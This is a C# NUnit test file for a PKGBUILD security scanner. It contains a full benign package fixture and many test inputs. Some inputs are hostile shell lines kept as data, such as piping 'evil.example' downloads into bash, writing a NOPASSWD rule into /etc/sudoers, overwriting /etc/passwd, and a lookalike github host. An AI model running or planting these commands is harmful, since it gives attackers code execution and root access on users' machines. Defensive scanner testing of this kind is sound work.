using System.Text;
using Atoll.Api.Services.Security;
using NUnit.Framework;

namespace Atoll.Api.Tests.Security;

public class PkgBuildSecurityScannerTests
{
    // Regression fixture from the Shelly 3.0.1+1 PKGBUILD. It includes the
    // real source declaration, build/check functions, and package-script patterns
    // that are relevant to the scanner.
    private const string ShellyPkgbuild =
        """
        # Maintainer: Zoey Bauer <zoey.erin.bauer@gmail.com>
        # Maintainer: Caroline Snyder <hirpeng@gmail.com>
        pkgbase=shelly
        pkgname=('shelly' 'shelly-flatpak-backend')
        pkgver=3.0.1+1
        pkgrel=2
        arch=('x86_64')
        url="https://github.com/Seafoam-Labs/Shelly-ALPM"
        license=('GPL-3.0-only')
        makedepends=('git' 'pkgconf' 'gtk4' 'zig>=0.16' 'clang' 'gettext' 'vala' 'meson' 'ninja' 'flatpak' 'ripgrep')

        source=("${pkgname}-${pkgver}.tar.gz::https://github.com/Seafoam-Labs/Shelly-ALPM/archive/v${pkgver}.tar.gz")
        sha256sums=('f7e4b35e7d07bc9cfc95b4a923e22889356f7f98d06d3bdebfc7bc4b8729e80c')
        _source_dir="Shelly-ALPM-${pkgver//+/-}"

        build() {
          cd "$srcdir/${_source_dir}"

          (cd Shelly.Flatpak.Backend && zig build --verbose \
            --prefix "${srcdir}/${_source_dir}/out-flatpak-backend" \
            --cache-dir "${srcdir}/zig-cache" \
            --global-cache-dir "${srcdir}/zig-global-cache" \
            -Dcpu=baseline \
            -Doptimize=ReleaseSafe)

          (cd Shelly.Ui.Gtk && zig build --verbose \
            --prefix "${srcdir}/${_source_dir}/out" \
            --cache-dir "${srcdir}/zig-cache" \
            --global-cache-dir "${srcdir}/zig-global-cache" \
            -Dflatpak-backend-package=shelly-flatpak-backend \
            -Dcpu=baseline \
            -Doptimize=ReleaseSafe)

          meson setup --prefix=/usr build-notify Shelly.Notifications
          meson compile -C build-notify

          ./out-cli/bin/shelly utility --completions bash > shelly.bash
          ./out-cli/bin/shelly utility --completions fish > shelly.fish
          ./out-cli/bin/shelly utility --completions zsh > _shelly

          for po_file in Shelly.Ui.Gtk/po/*.po; do
            [ -f "$po_file" ] || continue
            lang=$(basename "$po_file" .po)
            msgfmt "$po_file" -o "shelly-ui-${lang}.mo"
          done

          for po_file in Shelly.Notifications/po/*.po; do
            [ -f "$po_file" ] || continue
            lang=$(basename "$po_file" .po)
            msgfmt "$po_file" -o "shelly-notifications-${lang}.mo"
          done
        }

        check() {
          cd "$srcdir/${_source_dir}"
          (cd Shelly.Flatpak.Backend && zig build test abi-test integration-test \
            --cache-dir "${srcdir}/zig-cache" \
            --global-cache-dir "${srcdir}/zig-global-cache")
          scripts/check-flatpak-separation.sh \
            out-cli/bin/shelly \
            out-flatpak-backend/lib/libshelly-flatpak-backend.so.1
        }

        package_shelly() {
          pkgdesc="Shelly: A Modern Arch Package Manager"
          depends=('pacman' 'gtk4' 'glib2' 'sudo' 'tar' 'bash' 'git' 'dbus' 'glibc')
          optdepends=('shelly-flatpak-backend: Flatpak package management support')

          cd "$srcdir/${_source_dir}"
          install -Dm755 out-cli/bin/shelly "$pkgdir/usr/bin/shelly"
          install -Dm644 shelly.bash "$pkgdir/usr/share/bash-completion/completions/shelly"

          cat <<'EOF' | install -Dm644 /dev/stdin "$pkgdir/usr/share/polkit-1/actions/com.shellyorg.shelly.policy"
        <policyconfig>
          <action id="com.shellyorg.shelly.pkexec.cli">
            <annotate key="org.freedesktop.policykit.exec.path">/usr/bin/shelly</annotate>
          </action>
        </policyconfig>
        EOF

          for mo_file in shelly-ui-*.mo; do
            if [ -f "$mo_file" ]; then
              lang=$(echo "$mo_file" | sed 's/shelly-ui-\(.*\)\.mo/\1/')
              install -Dm644 "$mo_file" "$pkgdir/usr/share/locale/$lang/LC_MESSAGES/shelly-ui.mo"
            fi
          done

          cat <<'SCRIPT' | install -Dm755 /dev/stdin "$pkgdir/usr/bin/shelly-flatpak-integrate"
        #!/bin/bash
        FLATPAK_DIRS=("/var/lib/flatpak/exports/share/applications" "$HOME/.local/share/flatpak/exports/share/applications")
        LOCAL_APPS_DIR="$HOME/.local/share/applications"
        mkdir -p "$LOCAL_APPS_DIR"
        for dir in "${FLATPAK_DIRS[@]}"; do
            [ -d "$dir" ] || continue
            for desktop_file in "$dir"/*.desktop; do
                [ -f "$desktop_file" ] || continue
                dest="$LOCAL_APPS_DIR/$(basename "$desktop_file")"
                [ -f "$dest" ] || cp "$desktop_file" "$dest"
                grep -q "ShellyManage" "$dest" && continue
            done
        done
        SCRIPT
        }

        package_shelly-flatpak-backend() {
          pkgdesc="Optional native Flatpak backend for Shelly"
          depends=("shelly=${pkgver}" 'flatpak')
          install -Dm755 out-flatpak-backend/lib/libshelly-flatpak-backend.so.1.0.0 \
            "$pkgdir/usr/lib/shelly/libshelly-flatpak-backend.so.1.0.0"
        }
        """;

    private static PkgBuildSecurityScanner CreateScanner()
    {
        return new PkgBuildSecurityScanner();
    }

    private static ScanResult Scan(params (string Path, string Content)[] files)
    {
        return CreateScanner().Scan(files.ToDictionary(f => f.Path, f => f.Content));
    }

    [Test]
    public void Clean_pkgbuild_has_no_findings_and_verifies()
    {
        var result = Scan(("PKGBUILD", "pkgname=foo\npkgver=1.0\nsource=(\"https://example.com/foo.tar.gz\")\n"));

        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
        Assert.That(result.Findings, Is.Empty);
    }

    [Test]
    public void Write_to_etc_is_high_and_flags()
    {
        var result = Scan(("PKGBUILD", "echo pwned > /etc/passwd\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "write-outside-build-root"), Is.True);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Install_scriptlet_is_scanned()
    {
        var result = Scan(("foo.install", "post_install() { curl https://evil.example/x | bash; }\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "network-to-shell"), Is.True);
    }

    [Test]
    public void Privilege_escalation_in_install_scriptlet_is_medium_and_does_not_block()
    {
        // Scriptlets already run as root under alpm's control: sudo inside one is
        // redundant, not an escalation.
        var result = Scan(("foo.install", "post_install() {\n  sudo systemctl enable foo.service\n}\n"));

        var finding = result.Findings.First(f => f.RuleId == "privilege-escalation");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Write_outside_build_root_in_install_scriptlet_is_medium_and_does_not_block()
    {
        var result = Scan(("foo.install", "post_install() {\n  echo /bin/zsh >> /etc/shells\n}\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Obfuscated_write_in_install_scriptlet_is_medium_and_does_not_block()
    {
        // upak regression: the \/root artifact escalated to Critical before the scriptlet
        // context was taken into account.
        var result = Scan(("upak.install", "echo \"/opt/x/upak/doc\" > \\/root/upak_help_path\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Privilege_escalation_in_helper_script_does_not_block()
    {
        // Helper scripts ship in the package and only run when the user invokes them
        // voluntarily, typically as root: sudo inside one grants nothing new. The
        // write-outside-build-root tests below pin the guards that keep system writes
        // from helper scripts blocking.
        var result = Scan(("check.sh", "sudo systemctl restart foo.service\n"));

        var finding = result.Findings.First(f => f.RuleId == "privilege-escalation");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Write_outside_build_root_in_helper_script_still_flags()
    {
        // No PKGBUILD in the file set, so there is no reference to check: the
        // conservative answer keeps the write blocking.
        var result = Scan(("dockerscript.sh", "echo 'yay ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Write_outside_build_root_in_referenced_helper_script_still_flags()
    {
        // The PKGBUILD invokes the script from build(), so its writes execute at
        // build time and keep blocking.
        var result = Scan(
            ("PKGBUILD", "pkgname=foo\n\nbuild() {\n  bash ./dockerscript.sh\n}\n"),
            ("dockerscript.sh", "echo 'yay ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Write_outside_build_root_in_unreferenced_helper_script_does_not_block()
    {
        // ferdium-bin regression: the maintainer-only docker build/release scripts
        // (build-in-docker.sh, build.sh, dockerscript.sh, update.sh) are never invoked
        // by the PKGBUILD; the sudoers write targets their own container anyway.
        var result = Scan(
            ("PKGBUILD",
                """
                pkgname=ferdium-bin
                pkgver=7.2.2

                package() {
                  install -Dm644 ferdium.desktop "$pkgdir/usr/share/applications/ferdium.desktop"
                }
                """),
            ("dockerscript.sh", "echo 'yay ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers\n"),
            ("build.sh", "docker run --rm archlinux:base-devel /bin/bash /root/dockerscript.sh\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(finding.Message, Does.Contain("never invokes").IgnoreCase);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Write_outside_build_root_in_script_only_staged_into_pkgdir_does_not_block()
    {
        // ccache-ext regression: update-ccache-links.sh appears in the PKGBUILD only as a
        // source-array entry and an install into $pkgdir - it runs later, on the user's
        // system via the pacman hook, never at build or install time.
        var result = Scan(
            ("PKGBUILD",
                """
                pkgname=ccache-ext
                pkgver=3
                pkgrel=1

                source=('update-ccache-links.sh'
                        'update-ccache-links.hook')
                sha256sums=('152d8d3cbe25c9c8380f98846f3f80e9b36fe375d4c2c182a9ab3e02ad757146'
                            'e7c0cb74b47371162262e1ad57590cbd41a3fdeaa4988370fde98ae19c75703c')

                package() {
                  install -Dm755 update-ccache-links.sh "${pkgdir}/usr/bin/update-ccache-links"
                }
                """),
            ("update-ccache-links.sh",
                "ret=`pacman -Qqo \"/usr/bin/$file\" | grep -e gcc -e clang`\n" +
                "echo -e \"#!/bin/sh -\\n/usr/bin/ccache /opt/cuda/bin/nvcc \\\"\\$@\\\"\" > /usr/lib/ccache/bin/nvcc-ccache\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(finding.Message, Does.Contain("never invokes").IgnoreCase);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Write_outside_build_root_in_script_only_staged_at_a_relative_path_does_not_block()
    {
        // crashplan-pro regression: upgrade.sh appears only in the source array and an
        // install whose destination is relative to a cd into $pkgdir - it runs later, on
        // the user's system via a path-triggered systemd unit, never at build time.
        var result = Scan(
            ("PKGBUILD",
                """
                pkgname=crashplan-pro
                pkgver=11.9.0
                pkgrel=1

                source=(https://example.org/CrashPlan.tgz
                        crashplan-pro.service
                        upgrade.sh
                        crashplan-pro_upgrade.service)
                sha1sums=('b4c3240af2be415ca464b3f2fe4abffb6c546027'
                          '194c2022af9809ba9a4694c747db01124c550ffb'
                          '8135b6e0fca07b5e3793faa8064ec480efda0063'
                          'c24e2ba2b2d6831246ea4af072305ddf5d1fd774')

                package() {
                  mkdir -p $pkgdir/opt/crashplan
                  cd $pkgdir/opt/crashplan
                  install -D -m 755 $srcdir/upgrade.sh bin/upgrade.sh
                }
                """),
            ("upgrade.sh", "echo \"LC_ALL=$LANG\" > /opt/crashplan/bin/run.conf\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(finding.Message, Does.Contain("never invokes").IgnoreCase);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Relative_destination_cp_in_build_does_not_count_as_invocation()
    {
        // A transport command never executes its operand, and a relative destination
        // lands inside the build tree even without a pkgdir literal.
        var result = Scan(
            ("PKGBUILD",
                """
                pkgname=foo
                source=('helper.sh')
                sha256sums=('SKIP')

                build() {
                  cp helper.sh bin/helper.sh
                }
                """),
            ("helper.sh", "echo x > /etc/sudoers\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Source_array_mention_with_typed_invocation_still_blocks()
    {
        // Declaring the script in source= stages it, but the typed ./helper.sh
        // invocation in build() is what runs it - the write stays blocking.
        var result = Scan(
            ("PKGBUILD",
                """
                pkgname=foo
                source=('helper.sh')
                sha256sums=('SKIP')

                build() {
                  ./helper.sh
                }
                """),
            ("helper.sh", "echo x > /etc/sudoers\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Inline_comment_after_staging_destination_does_not_count_as_invocation()
    {
        var result = Scan(
            ("PKGBUILD", "pkgname=foo\ninstall -Dm755 helper.sh $pkgdir/usr/bin/helper # packaged helper\n"),
            ("helper.sh", "echo x > /etc/sudoers\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Comment_mention_stays_conservatively_referenced()
    {
        var result = Scan(
            ("PKGBUILD", "pkgname=foo\n# helper.sh may be run manually\n"),
            ("helper.sh", "echo x > /etc/sudoers\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Invocation_after_source_array_on_the_same_line_still_blocks()
    {
        var result = Scan(
            ("PKGBUILD", "pkgname=foo\nsource=(helper.sh); bash helper.sh\n"),
            ("helper.sh", "echo x > /etc/sudoers\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Invocation_after_staging_command_on_the_same_line_still_blocks()
    {
        var result = Scan(
            ("PKGBUILD", "pkgname=foo\ninstall -Dm755 helper.sh $pkgdir/usr/bin/helper; bash helper.sh\n"),
            ("helper.sh", "echo x > /etc/sudoers\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Non_data_array_mention_still_blocks()
    {
        // Only makepkg data arrays (source, checksums, …) stage their entries; a mention
        // in any other array is treated as code the PKGBUILD reaches.
        var result = Scan(
            ("PKGBUILD", "pkgname=foo\nscripts=(./helper.sh)\n"),
            ("helper.sh", "echo x > /etc/sudoers\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Staging_to_system_path_still_blocks()
    {
        // The transport exemption covers staging into $pkgdir only: copying the script
        // straight to a system path is itself out-of-root behavior and keeps the mention.
        var result = Scan(
            ("PKGBUILD",
                """
                pkgname=foo

                package() {
                  install -Dm755 helper.sh /usr/bin/helper
                }
                """),
            ("helper.sh", "echo x > /etc/sudoers\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Install_scriptlet_entry_counts_as_a_reference()
    {
        // The scriptlet is wired up via install=, so its writes run under alpm's
        // control and take the scriptlet verdict, not the unreferenced one.
        var result = Scan(
            ("PKGBUILD", "pkgname=foo\ninstall=foo.install\n"),
            ("foo.install", "post_install() {\n  echo /bin/zsh >> /etc/shells\n}\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(finding.Message, Does.Contain("scriptlet").IgnoreCase);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Obfuscated_write_in_unreferenced_helper_script_stays_critical()
    {
        var result = Scan(
            ("PKGBUILD", "pkgname=foo\npkgver=1.0\n"),
            ("helper.sh", "echo x > /et''c/sudoers\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Helper_script_sensors_eval_does_not_block()
    {
        // Corpus regression fixture (baraction.sh): the eval'd text comes from the local
        // hardware monitor piped through local parsers.
        var result = Scan(("baraction.sh", "eval $(sensors 2>/dev/null | sed 's/  */ /g' | awk '{print $1}')\n"));

        var finding = result.Findings.First(f => f.RuleId == "eval-indirection");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Heredoc_help_text_mentioning_sudo_does_not_block()
    {
        var result = Scan(("PKGBUILD", "cat <<'EOF'\n## After editing run: sudo systemctl restart foo\nEOF\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Quoted_uninstall_instructions_in_scriptlet_do_not_block()
    {
        // Help text printed for the user: the pipe sits inside a quoted string, so
        // nothing is actually piped into a shell.
        var result = Scan(("foo.install",
            "post_remove() {\n  echo \"    curl -fsSL https://example.com/uninstall.sh | bash -s -- --purge --yes\"\n}\n"));

        Assert.That(
            result.Findings.Any(f => f.RuleId is "network-to-shell" or "network-execution" or "decode-to-shell"),
            Is.False);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Perl_release_tag_scraping_does_not_block()
    {
        // perl runs its inline -pe program on the download as stdin data; the fetch
        // itself stays visible as a Medium risky-tool finding.
        var result = Scan(("aur-cfg.sh",
            "get_pkgver() {\n  curl -s https://example.com/releases/latest | perl -pe 's!.*/tag/v?([0-9].+)!!'\n}\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "network-execution"), Is.False);
        Assert.That(result.Findings.Any(f => f.RuleId == "risky-tool"), Is.True);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Answer_feeding_local_installer_does_not_block()
    {
        // bash executes the local script file; the piped answer is only its stdin data.
        var result = Scan(("PKGBUILD", "package() {\n  echo n | bash ./install.sh --prefix=\"$pkgdir\" > /dev/null\n}\n"));

        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Non_script_binary_file_is_not_scanned()
    {
        var result = Scan(("data.bin", "curl https://evil.example/x | sh\n"));

        Assert.That(result.Findings, Is.Empty);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Local_elf_is_critical_while_binary_data_is_medium()
    {
        // Repository files reach the scanner as UTF-8-decoded strings, so decode
        // real on-disk bytes instead of relying on string escapes. This mirrors
        // how PackageService / AurMirror hand content to the scanner.
        var elf = Encoding.UTF8.GetString([0x7F, 0x45, 0x4C, 0x46, .. Encoding.UTF8.GetBytes("payload")]);
        var binary = "abc\0def";

        var result = Scan(
            ("tool", elf),
            ("data.bin", binary),
            ("script.sh", "#!/bin/sh\necho ok\n"));

        var findings = result.Findings.Where(f => f.RuleId == "local-binary").ToList();
        Assert.That(findings, Has.Count.EqualTo(2));
        Assert.That(findings[0].Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(findings[0].Message, Does.Contain("ELF executable"));
        Assert.That(findings[0].Snippet, Is.EqualTo("tool"));
        Assert.That(findings[1].Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(findings[1].Message, Does.Contain("binary data"));
        Assert.That(findings[1].Snippet, Is.EqualTo("data.bin"));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Local_source_file_with_only_invalid_utf8_is_retained_medium()
    {
        // A lone continuation byte (0x80) is not valid UTF-8 and decodes to the
        // replacement character (U+FFFD). With no NUL or control characters present the
        // file is treated as text in an unrecognized encoding: retained, non-blocking.
        var invalid = Encoding.UTF8.GetString([0x41, 0x80, 0x42]);

        var result = Scan(("blob", invalid));

        var finding = result.Findings.Single(f => f.RuleId == "local-binary");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(finding.Message, Does.Contain("unrecognized encoding"));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Scanner_is_deterministic()
    {
        var files = new[] { ("PKGBUILD", "curl https://evil.example/x.sh | sh\n") };
        var first = Scan(files);
        var second = Scan(files);

        Assert.That(second.Findings.Select(f => f.RuleId), Is.EqualTo(first.Findings.Select(f => f.RuleId)));
    }

    [Test]
    public void Shelly_pkgbuild_is_verified_with_only_expected_command_substitution_findings()
    {
        // The fourth historical finding - $(basename ...) inside the <<'SCRIPT' heredoc
        // body - is suppressed: a quoted delimiter makes the body literal data.
        var result = Scan(("PKGBUILD", ShellyPkgbuild));

        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
        Assert.That(result.Findings, Has.Count.EqualTo(3));
        Assert.That(result.Findings, Is.All.Matches<SecurityFinding>(f =>
            f is { RuleId: "command-substitution", Severity: FindingSeverity.Medium }));
    }

    [Test]
    public void Inert_media_source_files_are_medium_and_do_not_block()
    {
        var png = Encoding.UTF8.GetString([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, .. new byte[16]]);
        var pdf = "%PDF-1.7\nstream\n\0\0binary\nendstream\n";
        var font = Encoding.UTF8.GetString([0x00, 0x01, 0x00, 0x00, .. new byte[16]]);

        var result = Scan(
            ("icon.png", png),
            ("manual.pdf", pdf),
            ("font.ttf", font),
            ("PKGBUILD", "pkgname=foo\n"));

        var findings = result.Findings.Where(f => f.RuleId == "local-binary").ToList();
        Assert.That(findings, Has.Count.EqualTo(3));
        Assert.That(findings, Is.All.Matches<SecurityFinding>(f => f.Severity == FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Unrecognized_binary_source_files_are_medium_and_do_not_block()
    {
        // Only recognized executable formats (ELF, PE) block; opaque binary data is
        // retained for review at Medium.
        var result = Scan(("payload.bin", "abc\0def\n"));

        var finding = result.Findings.Single(f => f.RuleId == "local-binary");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Homograph_url_with_invisible_character_is_medium_and_does_not_block()
    {
        // Corpus regression fixture (poweriso-gui): U+0670, an invisible combining mark,
        // is prepended to the url scheme. The package looks clean on inspection, and the
        // mirror displays the raw url, so the finding is review-only.
        var result = Scan(("PKGBUILD", "pkgname=foo\nurl=\"\u0670http://www.poweriso.com/download.htm\"\n"));

        var finding = result.Findings.Single(f => f.RuleId == "homograph");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(finding.Message, Does.Contain("U+0670"));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Homograph_lookalike_source_host_is_medium_and_does_not_block()
    {
        // Cyrillic i (U+0456) spoofing the host of a download URL. Corpus-driven: every
        // stored homograph finding proved benign, so the rule is kept visible at Medium.
        var result = Scan(("PKGBUILD", "pkgname=foo\nsource=(\"https://g\u0456thub.com/foo/foo-1.0.tar.gz\")\n"));

        var finding = result.Findings.Single(f => f.RuleId == "homograph");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }
}
